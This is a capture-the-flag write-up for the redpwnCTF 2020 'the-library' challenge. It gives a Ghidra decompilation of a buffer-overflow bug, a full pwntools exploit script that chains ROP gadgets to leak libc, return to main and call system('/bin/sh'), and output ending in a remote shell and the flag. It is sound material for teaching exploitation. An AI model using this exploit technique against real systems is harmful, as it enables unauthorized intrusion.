# redpwnCTF 2020

## pwn/the-library

> NotDeGhost
> 
> 424
>
> There's not a lot of useful functions in the binary itself. I wonder where you can get some...
> 
> `nc 2020.redpwnc.tf 31350`
>
> [`the-library.c`](the-library.c) [`libc.so.6`](libc.so.6)
[`the-library`](the-library)

Tags: _pwn_ _x86-64_ _remote-shell_ _rop_ _bof_


## Summary

BOF -> ROP -> leak libc -> ret2main -> shell

## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No shellcode on the stack, but that's about it for mitigations.  Easy read/write GOT, easy BOF, easy ROP.

    
### Decompile with Ghidra

```c
undefined8 main(void)

{
  char local_18 [16];
  
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("Welcome to the library... What\'s your name?");
  read(0,local_18,0x100);
  puts("Hello there: ");
  puts(local_18);
  return 0;
}
```

I still disassemble/decompile even if source included for the following reasons:

1. Source can lie, it's true; at least two 2020 CTFs, the _source_ did not exactly match the binary behavior.  Probably older source, newer binary or vv.  OTOH, at times the remote binary is not the same as the downloaded binary, in that case, perhaps the source is correct.  Anyway, collect as much data as you can.
2. The compiler may interpret the source differently than your head.  This is especially true with stack offsets.
3. I've developed a consistent workflow, _checksec_ -> _Ghidra_ -> _explore a bit_ -> _think about it..._.  I've gotten used to looking at binaries with Ghidra and while source code can vary widely, Ghidra normalizes this somewhat, at least for me, unless Go, Rust, etc... binaries, then it's back to basics, _strings_ -> _objdump_ -> _testing_ -> _googling_ -> _panic_ :-) (Actually Go is doable, you get used to it, Rust is a completely different animal--this is a good thing).
4. I've become very dependent on the Ghidra stack diagrams, esp. for BOF.  Above, I know that the input buffer `local_18` is exactly `0x18` from the return address in the stack.  I also know if there are other variables where they are relative to each other so I can overflow just enough or avoid a canary, etc...

_Moving on..._

This is a simple BOF task, the input buffer is `0x18` bytes from the return address in the stack, and `read` will take up to `0x100` (256) bytes supporting a rather large ROP chain.

There's only one pass, and since ASLR will still obfuscate the location of libc, we'll have to leak that first and then jump back up to main.  With libc location known, we can get a shell.


## Exploit

```python
#!/usr/bin/python3

from pwn import *

binary = ELF('./the-library')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc.so.6')
context.update(arch='amd64',os='linux')

rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

#p = process(binary.path)
p = remote('2020.redpwnc.tf', 31350)
```

Initial setup and find a `pop rdi` gadget from the binary.


```python
payload  = 0x18 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got['puts'])
payload += p64(binary.plt['puts'])
payload += p64(binary.symbols['main'])

p.sendlineafter('name?',payload)

_ = p.recvuntil('Welcome').split(b'Welcome')[0].strip()[-6:]
puts = u64(_ + b'\x00\x00')
baselibc = puts - libc.symbols['puts']
print('baselibc',hex(baselibc))
libc.address = baselibc
```

First pass.  Just overflow the buffer with `0x18` bytes, then using `puts` from the GOT, have it leak it's address, then jump back to `main` for a second pass.

With the `puts` address known and the version of libc provided, computing the base of libc is trivial.


```python
payload  = 0x18 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(libc.search(b"/bin/sh").__next__())
payload += p64(libc.symbols['system'])

p.sendlineafter('name?',payload)

p.interactive()
```

Final pass.  Again overflow the buffer with `0x18` bytes, but this time call `system` from libc.

> The `p64(pop_rdi + 1)` is actually `ret` (`pop rdi` is 2 bytes, the 2nd is `ret`).  This fixes a stack alignment problem that would otherwise segfault `system`.  Most of the time it is needed, but not always, and in one recent case, `execve` had to be used instead.  See [Blind Piloting](https://github.com/datajerk/ctf-write-ups/blob/master/b01lersctf2020/blind-piloting/README.md) more info as well as links if you want a deeper understanding (it's long, search for _alignment_).

Output:

```
# ./exploit.py
[*] '/pwd/datajerk/redpwnctf2020/the-library/the-library'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/pwd/datajerk/redpwnctf2020/the-library/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loading gadgets for '/pwd/datajerk/redpwnctf2020/the-library/the-library'
[+] Opening connection to 2020.redpwnc.tf on port 31350: Done
baselibc 0x7f10b1c0a000
[*] Switching to interactive mode

Hello there:
AAAAAAAAAAAAAAAAAAAAAAAA4\x07
$ cat flag.txt
flag{jump_1nt0_th3_l1brary}
```
